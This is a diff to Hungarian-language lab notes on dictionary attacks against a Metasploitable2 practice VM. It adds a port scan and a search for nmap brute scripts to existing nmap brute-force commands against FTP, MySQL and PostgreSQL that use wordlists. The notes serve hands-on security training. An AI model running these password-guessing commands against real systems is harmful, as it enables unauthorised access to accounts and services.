@@ -4,6 +4,14 @@ Szótáralapú támadások különböző szolgáltatások ellen.
 
 1. A Metasploitable2 VM nyitott portjainak a megkeresése:
 
+1.1 Portscan futtatása
+sudo nmap 192.168.56.254 
+
+1.2 Az "nmap" portscan nagyon sok script-tel rendelkezik. A cél most az, hogy megkeressük azokat a "brute" script-eket, amelyek alkalmazhatók a szótáralapú támadásoknál.
+locate *.nse |grep brute
+
+A portscan segítségével megismerésre kerültek a nyitott portok, tehát a távolról elérhető szolgáltatások listája.
+
 2. Jelszavak online megkeresése.
 2.1 FTP
 sudo nmap -p21 --script ftp-brute.nse --script-args userdb=users2,passdb=passwords 192.168.56.254
@@ -28,3 +36,10 @@ sudo nmap -p3306 --script mysql-brute.nse --script-args userdb=users3,passdb=pas
 
 2.7 Postgresql
 sudo nmap -p5432 --script pgsql-brute.nse --script-args userdb=users3,passdb=passwords3 192.168.56.254
+
+-------------------------------------------
+
+A "Http" script-ekhez segítség:
+1. https://nmap.org/book/nse-usage.html#nse-categories
+2. https://nmap.org/nsedoc/scripts/http-form-brute.html
+
